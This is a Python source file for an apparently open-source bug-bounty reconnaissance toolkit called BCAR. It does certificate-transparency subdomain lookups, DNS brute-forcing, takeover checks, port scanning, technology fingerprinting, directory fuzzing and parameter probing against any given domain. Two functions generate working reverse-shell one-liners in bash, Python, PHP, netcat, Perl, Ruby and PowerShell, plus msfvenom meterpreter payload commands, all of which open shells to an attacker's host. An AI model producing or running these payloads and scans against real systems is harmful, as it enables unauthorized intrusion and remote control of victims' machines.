#!/usr/bin/env python3
"""
BCAR - Bug Bounty Certificate Authority Reconnaissance
Advanced reconnaissance toolkit for certificate transparency, subdomain discovery, and vulnerability assessment

Author: @cxb3rf1lth
Version: 1.0.0
Integration: Bl4ckC3ll_PANTHEON
"""

import os
import sys
import json
import time
import threading
import requests
import subprocess
import re
from urllib.parse import urlparse, urljoin
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import ssl
import base64
from dataclasses import dataclass, asdict
import logging

# Advanced Certificate Transparency and Subdomain Discovery
class BCARCore:
    """Core BCAR functionality for advanced reconnaissance"""
    
    def __init__(self, logger=None):
        self.logger = logger or self._setup_logger()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.found_subdomains = set()
        self.found_endpoints = set()
        self.certificates = []
        self.vulnerabilities = []
        
    def _setup_logger(self):
        """Setup basic logging"""
        logger = logging.getLogger('BCAR')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    def certificate_transparency_search(self, domain: str, limit: int = 1000) -> List[str]:
        """Search Certificate Transparency logs for subdomains"""
        subdomains = set()
        ct_sources = [
            f"https://crt.sh/?q=%25.{domain}&output=json",
            f"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names"
        ]
        
        for url in ct_sources:
            try:
                self.logger.info(f"Querying CT logs: {url}")
                response = self.session.get(url, timeout=30)
                if response.status_code == 200:
                    if 'crt.sh' in url:
                        data = response.json()
                        for entry in data[:limit]:
                            name_value = entry.get('name_value', '')
                            for name in name_value.split('\n'):
                                name = name.strip().lower()
                                if name and domain in name and not name.startswith('*'):
                                    subdomains.add(name)
                    elif 'certspotter' in url:
                        data = response.json()
                        for entry in data[:limit]:
                            dns_names = entry.get('dns_names', [])
                            for name in dns_names:
                                name = name.strip().lower()
                                if name and domain in name and not name.startswith('*'):
                                    subdomains.add(name)
            except Exception as e:
                self.logger.warning(f"CT source failed {url}: {e}")
                
        self.found_subdomains.update(subdomains)
        return list(subdomains)

    def advanced_subdomain_enumeration(self, domain: str, wordlist: List[str] = None) -> List[str]:
        """Advanced subdomain enumeration with multiple techniques"""
        if not wordlist:
            wordlist = self._get_default_subdomain_wordlist()
        
        subdomains = set()
        
        # DNS bruteforcing
        def check_subdomain(sub):
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                return subdomain
            except socket.gaierror:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomains.add(result)
                    
        self.found_subdomains.update(subdomains)
        return list(subdomains)

    def subdomain_takeover_check(self, subdomains: List[str]) -> List[Dict[str, Any]]:
        """Check for subdomain takeover vulnerabilities"""
        takeover_signatures = {
            'github.io': ['There isn\'t a GitHub Pages site here'],
            'herokuapp.com': ['No such app'],
            'wordpress.com': ['Do you want to register'],
            'amazoncognito.com': ['The specified bucket does not exist'],
            'amazonaws.com': ['NoSuchBucket', 'The specified bucket does not exist'],
            'bitbucket.io': ['Repository not found'],
            'zendesk.com': ['Help Center Closed'],
            'fastly.com': ['Fastly error: unknown domain'],
            'shopify.com': ['Only one step left!'],
            'surge.sh': ['project not found'],
            'tumblr.com': ['Whatever you were looking for doesn\'t currently exist'],
            'unbounce.com': ['The requested URL was not found on this server'],
            'desk.com': ['Please try again or try Desk.com'],
            'pingdom.com': ['Sorry, couldn\'t find the status page']
        }
        
        vulnerabilities = []
        
        def check_takeover(subdomain):
            try:
                response = self.session.get(f"http://{subdomain}", timeout=10, allow_redirects=True)
                content = response.text.lower()
                
                for service, signatures in takeover_signatures.items():
                    if service in subdomain:
                        for sig in signatures:
                            if sig.lower() in content:
                                return {
                                    'subdomain': subdomain,
                                    'service': service,
                                    'signature': sig,
                                    'status_code': response.status_code,
                                    'vulnerable': True,
                                    'confidence': 'HIGH'
                                }
            except Exception as e:
                self.logger.debug(f"Takeover check failed for {subdomain}: {e}")
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_takeover, sub): sub for sub in subdomains}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    
        self.vulnerabilities.extend(vulnerabilities)
        return vulnerabilities

    def advanced_port_scanning(self, targets: List[str], ports: List[int] = None) -> Dict[str, List[int]]:
        """Advanced port scanning with service detection"""
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
        
        open_ports = {}
        
        def scan_port(target, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target, port))
                sock.close()
                return port if result == 0 else None
            except Exception:
                return None
        
        for target in targets:
            self.logger.info(f"Port scanning: {target}")
            target_ports = []
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = {executor.submit(scan_port, target, port): port for port in ports}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        target_ports.append(result)
            
            if target_ports:
                open_ports[target] = sorted(target_ports)
                
        return open_ports

    def web_technology_detection(self, urls: List[str]) -> Dict[str, Dict[str, Any]]:
        """Detect web technologies and frameworks"""
        technology_patterns = {
            'Apache': [r'Server: Apache', r'apache'],
            'Nginx': [r'Server: nginx', r'nginx'],
            'IIS': [r'Server: Microsoft-IIS', r'X-Powered-By: ASP.NET'],
            'PHP': [r'X-Powered-By: PHP', r'\.php'],
            'ASP.NET': [r'X-Powered-By: ASP.NET', r'aspnet'],
            'WordPress': [r'wp-content', r'wp-includes'],
            'Drupal': [r'sites/default', r'drupal'],
            'Joomla': [r'administrator/index.php', r'joomla'],
            'jQuery': [r'jquery'],
            'Bootstrap': [r'bootstrap'],
            'React': [r'react', r'_react'],
            'Angular': [r'angular', r'ng-'],
            'Vue.js': [r'vue\.js', r'__vue__']
        }
        
        results = {}
        
        def analyze_url(url):
            try:
                response = self.session.get(url, timeout=10)
                headers = str(response.headers)
                content = response.text
                
                technologies = {}
                for tech, patterns in technology_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, headers + content, re.IGNORECASE):
                            technologies[tech] = {'detected': True, 'confidence': 'medium'}
                            break
                
                return {
                    'url': url,
                    'status_code': response.status_code,
                    'technologies': technologies,
                    'server': response.headers.get('Server', 'Unknown'),
                    'title': self._extract_title(content)
                }
            except Exception as e:
                self.logger.debug(f"Technology detection failed for {url}: {e}")
                return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(analyze_url, url): url for url in urls}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results[result['url']] = result
                    
        return results

    def advanced_fuzzing(self, base_url: str, wordlist: List[str] = None, extensions: List[str] = None) -> List[Dict[str, Any]]:
        """Advanced directory and parameter fuzzing"""
        if not wordlist:
            wordlist = self._get_default_fuzzing_wordlist()
        if not extensions:
            extensions = ['', '.php', '.asp', '.aspx', '.jsp', '.html', '.txt', '.bak', '.old']
        
        findings = []
        interesting_codes = [200, 301, 302, 403, 500]
        
        def fuzz_path(path, ext):
            url = urljoin(base_url, f"{path}{ext}")
            try:
                response = self.session.get(url, timeout=5, allow_redirects=False)
                if response.status_code in interesting_codes:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('content-type', ''),
                        'title': self._extract_title(response.text) if response.status_code == 200 else None
                    }
            except Exception as e:
                self.logger.debug(f"Fuzzing failed for {url}: {e}")
            return None
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            for word in wordlist:
                for ext in extensions:
                    futures.append(executor.submit(fuzz_path, word, ext))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    findings.append(result)
        
        return findings

    def parameter_discovery(self, url: str, method: str = 'GET') -> List[Dict[str, Any]]:
        """Discover hidden parameters using various techniques"""
        common_params = [
            'id', 'user', 'account', 'number', 'order', 'no', 'doc', 'key', 'email', 'group', 'profile',
            'edit', 'report', 'debug', 'test', 'demo', 'admin', 'root', 'password', 'pass', 'passwd',
            'token', 'secret', 'api_key', 'access_token', 'auth', 'login', 'logout', 'redirect',
            'callback', 'return', 'url', 'link', 'src', 'file', 'path', 'dir', 'folder', 'page',
            'view', 'cat', 'action', 'cmd', 'exec', 'system', 'shell', 'query', 'search', 'q'
        ]
        
        found_params = []
        
        def test_parameter(param):
            try:
                if method.upper() == 'GET':
                    test_url = f"{url}?{param}=test"
                    response = self.session.get(test_url, timeout=5)
                else:
                    response = self.session.post(url, data={param: 'test'}, timeout=5)
                
                # Check for parameter reflection or different response
                if 'test' in response.text or response.status_code != 200:
                    return {
                        'parameter': param,
                        'method': method,
                        'reflected': 'test' in response.text,
                        'status_code': response.status_code
                    }
            except Exception as e:
                self.logger.debug(f"Parameter test failed for {param}: {e}")
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(test_parameter, param): param for param in common_params}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_params.append(result)
        
        return found_params

    def generate_reverse_shell_payloads(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate various reverse shell payloads"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{lhost}\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
            'php': f"php -r '$sock=fsockopen(\\\"{lhost}\\\",{lport});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'perl': f"perl -e 'use Socket;$i=\\\"{lhost}\\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");}};'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\\\"{lhost}\\\",{lport}).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport})"
        }
        
        # URL encoded versions
        encoded_payloads = {}
        for name, payload in payloads.items():
            try:
                encoded_payloads[f"{name}_url_encoded"] = requests.utils.quote(payload)
            except Exception:
                # Skip encoding if it fails
                pass
        
        payloads.update(encoded_payloads)
        return payloads

    def _get_default_subdomain_wordlist(self) -> List[str]:
        """Get default subdomain wordlist"""
        return [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',
            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'ns', 'm', 'imap', 'test', 'ns3',
            'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns4', 'email',
            'winmail', 'com', 'mail2', 'cs', 'mx', 'ww1', 'webmail2', 'post', 'web', 'www1',
            'dir', 'connect', 'ww42', 'wiki', 'gateway', 'demo', 'api', 'cdn', 'media', 'static',
            'assets', 'images', 'img', 'css', 'js', 'app', 'mobile', 'support', 'help', 'docs',
            'beta', 'alpha', 'stage', 'staging', 'prod', 'production', 'git', 'svn', 'backup',
            'old', 'new', 'shop', 'store', 'secure', 'ssl', 'login', 'dashboard', 'panel'
        ]

    def _get_default_fuzzing_wordlist(self) -> List[str]:
        """Get default directory fuzzing wordlist"""
        return [
            'admin', 'administrator', 'login', 'test', 'demo', 'backup', 'old', 'new', 'temp',
            'tmp', 'config', 'conf', 'cfg', 'settings', 'setup', 'install', 'db', 'database',
            'sql', 'logs', 'log', 'debug', 'dev', 'development', 'prod', 'production', 'staging',
            'assets', 'static', 'public', 'private', 'secure', 'protected', 'restricted', 'hidden',
            'secret', 'internal', 'system', 'sys', 'root', 'www', 'home', 'user', 'users',
            'account', 'accounts', 'profile', 'profiles', 'member', 'members', 'client', 'clients',
            'customer', 'customers', 'guest', 'guests', 'upload', 'uploads', 'download', 'downloads',
            'file', 'files', 'doc', 'docs', 'document', 'documents', 'pdf', 'image', 'images',
            'img', 'pic', 'pics', 'photo', 'photos', 'video', 'videos', 'audio', 'media',
            'css', 'js', 'script', 'scripts', 'style', 'styles', 'font', 'fonts', 'inc', 'include',
            'lib', 'library', 'class', 'classes', 'function', 'functions', 'api', 'service',
            'services', 'web', 'site', 'sites', 'page', 'pages', 'content', 'data', 'cache'
        ]

    def _extract_title(self, html: str) -> Optional[str]:
        """Extract title from HTML content"""
        try:
            match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
            return match.group(1).strip() if match else None
        except Exception:
            return None

    def run_comprehensive_scan(self, domain: str, config: Dict[str, Any] = None) -> Dict[str, Any]:
        """Run comprehensive BCAR scan"""
        if not config:
            config = {
                'ct_search': True,
                'subdomain_enum': True,
                'takeover_check': True,
                'port_scan': True,
                'tech_detection': True,
                'directory_fuzz': True,
                'parameter_discovery': True
            }
        
        results = {
            'domain': domain,
            'scan_time': datetime.now().isoformat(),
            'subdomains': [],
            'takeover_vulnerabilities': [],
            'open_ports': {},
            'technologies': {},
            'directories': [],
            'parameters': []
        }
        
        self.logger.info(f"Starting comprehensive BCAR scan for {domain}")
        
        # Certificate Transparency Search
        if config.get('ct_search', True):
            self.logger.info("Running Certificate Transparency search...")
            ct_subdomains = self.certificate_transparency_search(domain)
            results['subdomains'].extend(ct_subdomains)
        
        # Subdomain Enumeration
        if config.get('subdomain_enum', True):
            self.logger.info("Running subdomain enumeration...")
            enum_subdomains = self.advanced_subdomain_enumeration(domain)
            results['subdomains'].extend(enum_subdomains)
        
        # Remove duplicates
        results['subdomains'] = list(set(results['subdomains']))
        
        # Subdomain Takeover Check
        if config.get('takeover_check', True) and results['subdomains']:
            self.logger.info("Checking for subdomain takeover vulnerabilities...")
            takeover_vulns = self.subdomain_takeover_check(results['subdomains'])
            results['takeover_vulnerabilities'] = takeover_vulns
        
        # Port Scanning
        if config.get('port_scan', True) and results['subdomains']:
            self.logger.info("Running port scans...")
            open_ports = self.advanced_port_scanning(results['subdomains'][:10])  # Limit for demo
            results['open_ports'] = open_ports
        
        # Technology Detection
        if config.get('tech_detection', True) and results['subdomains']:
            self.logger.info("Detecting web technologies...")
            urls = [f"http://{sub}" for sub in results['subdomains'][:5]]  # Limit for demo
            technologies = self.web_technology_detection(urls)
            results['technologies'] = technologies
        
        # Directory Fuzzing
        if config.get('directory_fuzz', True) and results['subdomains']:
            self.logger.info("Running directory fuzzing...")
            base_url = f"http://{results['subdomains'][0]}" if results['subdomains'] else f"http://{domain}"
            directories = self.advanced_fuzzing(base_url, wordlist=self._get_default_fuzzing_wordlist()[:50])
            results['directories'] = directories
        
        # Parameter Discovery
        if config.get('parameter_discovery', True) and results['subdomains']:
            self.logger.info("Running parameter discovery...")
            test_url = f"http://{results['subdomains'][0]}" if results['subdomains'] else f"http://{domain}"
            parameters = self.parameter_discovery(test_url)
            results['parameters'] = parameters
        
        self.logger.info(f"BCAR scan completed for {domain}")
        return results


# Integration wrapper for Pantheon
class PantheonBCARIntegration:
    """Integration wrapper for BCAR with Pantheon framework"""
    
    def __init__(self, pantheon_instance=None):
        self.pantheon = pantheon_instance
        self.bcar = BCARCore()
        self.results_dir = Path("bcar_results")
        self.results_dir.mkdir(exist_ok=True)
    
    def integrate_with_pantheon_scan(self, targets: List[str], scan_config: Dict[str, Any] = None) -> Dict[str, Any]:
        """Integrate BCAR functionality with existing Pantheon scan"""
        combined_results = {
            'bcar_results': {},
            'integration_timestamp': datetime.now().isoformat(),
            'targets_processed': len(targets)
        }
        
        for target in targets:
            domain = urlparse(f"http://{target}").netloc or target
            bcar_results = self.bcar.run_comprehensive_scan(domain, scan_config)
            combined_results['bcar_results'][domain] = bcar_results
            
            # Save individual results
            result_file = self.results_dir / f"bcar_{domain}_{int(time.time())}.json"
            with open(result_file, 'w') as f:
                json.dump(bcar_results, f, indent=2)
        
        return combined_results
    
    def generate_meterpreter_payloads(self, lhost: str, lport: int = 4444) -> Dict[str, str]:
        """Generate meterpreter-compatible payloads"""
        meterpreter_payloads = {
            'windows_meterpreter_reverse_tcp': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe",
            'linux_meterpreter_reverse_tcp': f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf",
            'php_meterpreter_reverse_tcp': f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw",
            'java_meterpreter_reverse_tcp': f"msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f jar",
            'python_meterpreter_reverse_tcp': f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f py"
        }
        
        # Also include basic reverse shells
        basic_payloads = self.bcar.generate_reverse_shell_payloads(lhost, lport)
        meterpreter_payloads.update(basic_payloads)
        
        return meterpreter_payloads
    
    def enhanced_reconnaissance(self, domain: str) -> Dict[str, Any]:
        """Enhanced reconnaissance with BCAR integration"""
        recon_config = {
            'ct_search': True,
            'subdomain_enum': True, 
            'takeover_check': True,
            'port_scan': True,
            'tech_detection': True,
            'directory_fuzz': False,  # Skip intensive fuzzing for quick recon
            'parameter_discovery': False
        }
        
        return self.bcar.run_comprehensive_scan(domain, recon_config)


# CLI interface for standalone usage
def main():
    """Main CLI interface for BCAR"""
    import argparse
    
    parser = argparse.ArgumentParser(description="BCAR - Bug Bounty Certificate Authority Reconnaissance")
    parser.add_argument('domain', help='Target domain to scan')
    parser.add_argument('--ct-only', action='store_true', help='Only run Certificate Transparency search')
    parser.add_argument('--subdomain-only', action='store_true', help='Only run subdomain enumeration')
    parser.add_argument('--takeover-only', action='store_true', help='Only check for subdomain takeover')
    parser.add_argument('--output', '-o', help='Output file for results (JSON format)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Setup logging
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    # Initialize BCAR
    bcar = BCARCore()
    
    # Configure scan
    config = {}
    if args.ct_only:
        config = {'ct_search': True, 'subdomain_enum': False, 'takeover_check': False, 
                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}
    elif args.subdomain_only:
        config = {'ct_search': False, 'subdomain_enum': True, 'takeover_check': False,
                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}
    elif args.takeover_only:
        config = {'ct_search': True, 'subdomain_enum': True, 'takeover_check': True,
                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}
    
    # Run scan
    results = bcar.run_comprehensive_scan(args.domain, config)
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))


if __name__ == '__main__':
    main()